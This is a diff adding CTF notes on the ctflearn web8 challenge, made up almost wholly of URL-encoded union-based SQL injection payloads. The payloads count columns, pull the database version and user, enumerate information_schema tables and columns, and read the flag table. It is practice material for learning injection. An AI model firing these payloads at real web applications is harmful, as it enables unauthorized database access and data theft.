@@ -1,0 +1,21 @@
+URL: https://web.ctflearn.com/web8/
+
+Trials of Exploitation of SQLinjection:
+
+Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html
+
+https://web.ctflearn.com/web8/?id=1%20order%20by%204--
+
+https://web.ctflearn.com/web8/?id=1%20union%20select%20version(),user(),database(),4--
+
+https://web.ctflearn.com/web8/?id=1%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()%20--+
+
+https://web.ctflearn.com/web8/?id=1%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()%20%20limit%201,1%20--+
+
+https://web.ctflearn.com/web8/?id=1%20UNION%20SELECT%201,table_name,3,4%20FROM%20information_schema.tables
+
+https://web.ctflearn.com/web8/?id=1%20union%20Select%20table_name,2,3,4%20from%20information_schema.columns%20where%20table_schema=database()%20--+
+
+https://web.ctflearn.com/web8/?id=1%20union%20Select%201,table_name,column_name,4%20from%20information_schema.columns%20where%20table_schema=database()%20--+
+
+https://web.ctflearn.com/web8/?id=1+union+select+1%2C+f0und_m3%2C3%2C4+from+w0w_y0u_f0und_m3
